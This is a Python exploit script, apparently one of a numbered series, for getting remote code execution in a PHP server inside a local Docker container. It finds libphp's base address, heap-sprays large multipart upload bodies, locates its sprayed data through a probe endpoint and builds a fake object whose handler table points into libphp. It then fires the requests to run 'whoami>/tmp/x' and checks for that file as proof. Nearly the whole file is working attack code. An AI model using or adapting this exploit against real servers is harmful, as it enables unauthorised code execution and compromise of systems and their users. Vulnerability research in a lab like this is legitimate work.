#!/usr/bin/env python3
"""oom99: tiny-probe single-worker closing run.

98g evidence: OBJ=0x7f748da01908 crashed at dec +539 on an UNMAPPED
region — the probe request's own 12x2MB scan OOM'd itself, fataled,
and its regions munmapped before the fires.

Fixes in 99:
  - probe requests are TINY: single region, 256KB chunks, stop at first
    hit (server-side break) -> probe never OOMs -> regions survive
  - one worker pinned (MaxRequestWorkers 1) -> same address space
  - post-sacrifice readback of the tile BEFORE firing (prove survival)
  - 4 aim-shaped fires; check /tmp/x after each
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=90):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

# ---------- libphp base ----------
BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
BOFF = 488          # BLOCK offset in the value tile
MOFF = BOFF + TILE  # marker offset (664)
MARKER = b"ZAIMZAIM" * 24   # 192B

def obj_block():
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)   # rc=1, ti=0x108
    struct.pack_into("<II", B, 0x08, 1, 0)       # handle=1, pad
    struct.pack_into("<Q",  B, 0x10, 0)          # ce (never read, DC set)
    return B  # rest patched by caller (needs OBJ)

def gs_block():
    S = struct.pack("<IIQ", 1, 0, 13) + b"whoami>/tmp/x\x00"
    return S + b"\x00" * ((-len(S)) % 8)

def build_tile(OBJ, BOFF, ALIGN):
    T = bytearray(1537)
    for off in range(ALIGN, BOFF, 8):        # VA-aligned pointer run
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = obj_block()
    # inside-BLOCK fields (all offsets BOFF-relative in tile coords):
    T[BOFF + 0x18:BOFF + 0x20] = struct.pack("<Q", OBJ + 0x80)      # handlers=table
    T[BOFF + 0x28:BOFF + 0x2C] = struct.pack("<I", 1)               # num_args
    T[BOFF + 0x50:BOFF + 0x58] = struct.pack("<Q", OBJ + 0x68)      # arg value = gs
    T[BOFF + 0x58:BOFF + 0x5C] = struct.pack("<I", 6)               # arg type=IS_STRING
    G = gs_block()
    T[BOFF + 0x68:BOFF + 0x68 + len(G)] = G                         # gs at +0x68
    T[BOFF + 0x80:BOFF + 0x80 + 16] = struct.pack("<QQ", 0, BASE + ZIF)  # table
    T[MOFF:MOFF + 192] = MARKER
    return bytes(T)

def probe_small(needle):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=6" % (HOST + "/oom_probe.php", h), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            rva = int(m.group(1))
            offs = [int(x, 16) for x in m.group(2).split()]
            if offs:
                return rva, offs
    return None, None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

# ================= boot cycle =================
SENT = b"ABCDEFGH"

# 1. FAT warm-up posts (skinny ones don't create surviving regions)
warm_tile = (b"WARMUPX" * 192 + b"W" * 400)[:1537]
warm = aim_body(warm_tile)
for i in range(50):
    post(warm)
rva, offs = probe_small(b"WARMUPX" * 24)
OUT("    probe: R=0x%x offs=%s" % (rva or 0, offs[:4]))
assert rva and offs, "no sentinel region"

V = offs[0]                       # first hit = value0 VA (ABSOLUTE, probe prints abs)
OUT("    V=0x%x (mod16=%d)" % (V, V & 0xF))

# 2. compute OBJ: pointer slots at VA-aligned offsets; BLOCK at nibble-8 VA
ALIGN = (8 - (V & 0xF)) % 8        # first tile offset whose VA is 8-aligned
OBJ = None
for BOFF_USE in range(ALIGN + 352, 1537 - TILE - 208, 8):
    cand = V + BOFF_USE
    if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1:
        OBJ = cand
        break
OUT("    OBJ=0x%x (BOFF=%s ALIGN=%d)" % (OBJ if OBJ else 0,
      BOFF_USE if OBJ else "NONE", ALIGN))
assert OBJ

# 3. sacrifice with AIM tile
tile = build_tile(OBJ, BOFF_USE, ALIGN)
code, resp = post(aim_body(tile))
OUT("    sacrifice: %s %r" % (code, resp[:60]))

# 4. readback: does the aimed tile survive in-process?
rb = get("%s?read=%d&n=48" % (HOST + "/oom_probe.php", OBJ), timeout=30)
OUT("    readback @OBJ: %s" % rb[:100])
q0, q1 = rb[:16], rb[16:32]
if q0 and q0 != "ERR":
    rc = struct.unpack("<I", bytes.fromhex(q0[:8]))[0]
    ti = struct.unpack("<I", bytes.fromhex(q0[8:16]))[0]
    OUT("    rc=%d ti=0x%x handle=%d" % (rc, ti, struct.unpack("<I", bytes.fromhex(q1[0:8]))[0]))
    assert rc == 1 and ti == 0x108, "tile dead at OBJ"

# 5. hammer
for fi in range(4):
    sb = 9210000 + fi * 4
    code, resp = post(aim_body(tile))
    OUT("    [f] fire%d (%d): %s" % (fi, sb, code))
    if check_x("fire%d" % fi):
        OUT("*** RCE CONFIRMED ***")
        break
    if code == "ERR":
        time.sleep(3)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
